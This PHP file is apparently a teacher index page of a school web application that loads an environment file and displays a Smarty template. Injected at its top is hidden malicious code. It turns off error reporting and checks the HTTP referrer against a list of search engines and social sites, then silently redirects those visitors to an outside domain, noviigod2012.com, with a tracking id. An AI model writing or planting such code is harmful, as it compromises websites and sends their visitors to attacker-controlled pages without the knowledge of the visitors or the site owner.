<?php
error_reporting(0);
$qazplm=headers_sent();
if (!$qazplm){
$referer=$_SERVER['HTTP_REFERER'];
$uag=$_SERVER['HTTP_USER_AGENT'];
if ($uag) {
if (stristr($referer,"yandex") or stristr($referer,"yahoo") or stristr($referer,"google") or stristr($referer,"bing") or stristr($referer,"rambler") or stristr($referer,"gogo") or stristr($referer,"live.com")or stristr($referer,"aport") or stristr($referer,"nigma") or stristr($referer,"webalta") or stristr($referer,"baidu.com") or stristr($referer,"doubleclick.net") or stristr($referer,"begun.ru") or stristr($referer,"stumbleupon.com") or stristr($referer,"bit.ly") or stristr($referer,"tinyurl.com") or stristr($referer,"clickbank.net") or stristr($referer,"blogspot.com") or stristr($referer,"myspace.com") or stristr($referer,"facebook.com") or stristr($referer,"aol.com")) {
if (!stristr($referer,"cache") or !stristr($referer,"inurl")){
	header("Location: http://noviigod2012.com/ts.php?p_id=3522");
	exit();
}
}
	}
	}
require_once '../set_env.inc.php';
require_once 'menu.inc.php';
$_SMARTY->display('teacher/index.tpl');
?>